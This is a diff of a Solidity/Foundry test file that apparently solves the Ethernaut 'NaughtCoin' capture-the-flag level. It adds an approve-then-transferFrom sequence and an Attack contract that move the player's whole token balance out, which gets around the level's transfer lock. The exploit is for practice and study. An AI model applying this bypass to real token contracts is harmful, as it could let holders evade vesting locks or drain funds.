@@ -39,10 +39,22 @@ contract TestNaughtCoin is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
-
+        //Attack attack = new Attack(levelAddress);
+        //level.approve(address(attack), level.balanceOf(player));
+        //attack.attack();
+        level.approve(player, level.balanceOf(player));
+        level.transferFrom(player, address(this), level.balanceOf(player));
         vm.stopPrank();
+    }
+}
 
-        //assertEq(level.balanceOf(player), 0);
-        //assertEq(level.balanceOf(tempUser), playerBalance);
+contract Attack {
+    NaughtCoin private level;
+    constructor(address _target) public payable {
+        level = NaughtCoin(_target);
+    }
+
+    function attack() public {
+        level.transferFrom(msg.sender, address(this), level.balanceOf(msg.sender));
     }
 }
